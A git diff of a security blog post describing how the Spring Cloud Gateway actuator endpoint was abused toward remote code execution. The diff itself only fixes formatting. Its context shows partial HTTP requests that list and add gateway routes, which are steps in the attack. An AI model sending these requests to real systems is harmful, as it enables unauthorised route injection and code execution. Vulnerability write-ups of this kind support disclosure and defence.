@@ -19,7 +19,6 @@ categories: jekyll update
 ![](/assets/spring-gateway/my-date.png)
 
 Seem that we reported later than him 1day. T.T
-</i>
 
 # I. Inspiration
 The vulnerability was inspired by the blog `https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/` which was released on 20th December 2021. From this blog, the author ends with the SSRF by designing with the exposed `actuator` endpoint. After reading the docs of `Spring Cloud Gateway`, @rskvp93 - my mentor, comes with the idea of using `global filter` to gain the Remote Code Execution through EL Injection. 
@@ -37,7 +36,7 @@ There is a list of public endpoint `/actuator` that can help us to construct a r
 ![](/assets/spring-gateway/actuator-gateway-endpoints.png)
 
 As the analysis of the above blog, we will summary some promising endpoints:
-1. List all route:
+### 1. List all route:
 
 ```
 GET /actuator/gateway/routes HTTP/1.1
@@ -49,7 +48,7 @@ Connection: close
 
 ![List Route](/assets/spring-gateway/list-routes.png)
 
-2. Add a route:
+### 2. Add a route:
 
 ```
 POST /actuator/gateway/routes/test HTTP/1.1
@@ -82,7 +81,7 @@ Content-Length: 334
 ```
 
 ![List Route](/assets/spring-gateway/new-route.png)
-3. Refresh route:
+### 3. Refresh route:
 After adding a route, all the new route need a subsequent request to make the application recognize.
 
 ```
